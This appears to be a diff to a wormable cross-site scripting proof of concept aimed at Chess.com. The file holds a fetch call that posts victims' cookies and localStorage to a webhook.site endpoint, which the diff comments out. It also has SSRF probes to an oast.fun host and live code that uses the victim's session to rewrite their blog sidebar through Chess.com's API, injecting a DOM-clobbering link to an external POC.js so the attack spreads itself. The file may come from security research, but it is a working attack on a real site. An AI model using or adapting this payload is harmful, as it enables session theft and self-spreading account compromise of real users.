@@ -1,7 +1,7 @@
 // ==========================================
 // Wormable XSS Payload - Chess.com 
 // ==========================================
-alert("XSS 4 by Hussein on: " + document.domain);
+alert("XSS 5 by Hussein on: " + document.domain);
 
 // <img src="http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest1"/>
 // <link rel="stylesheet" href="http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest2" >
@@ -52,11 +52,11 @@ alert("XSS 4 by Hussein on: " + document.domain);
 // var userStorage = JSON.stringify(localStorage);
 // var exfilData = "===== COOKIES =====\n" + userCookies + "\n\n===== LOCAL STORAGE =====\n" + userStorage;
 
-fetch("https://webhook.site/52bfb7b5-26b8-4e09-8f3e-3914f4ff53c0", {
-    method: "POST",
-    mode: "no-cors",
-    body: exfilData
-});
+// fetch("https://webhook.site/52bfb7b5-26b8-4e09-8f3e-3914f4ff53c0", {
+//     method: "POST",
+//     mode: "no-cors",
+//     body: exfilData
+// });
 const apiUrl = 'https://api.chess.com/rpc/chesscom.user_profile.v1.UserProfileService/SetBlogDetails';
 const username = window.context.user.username;
 const maliciousSidebar = "<p>Hey, check out this cool trick! <a id=\"__tudeConfig\"></a><a id=\"__tudeConfig\" href=\"https://hussein-e4.github.io/POC.js\" name=\"endpoint\"></a></p>";
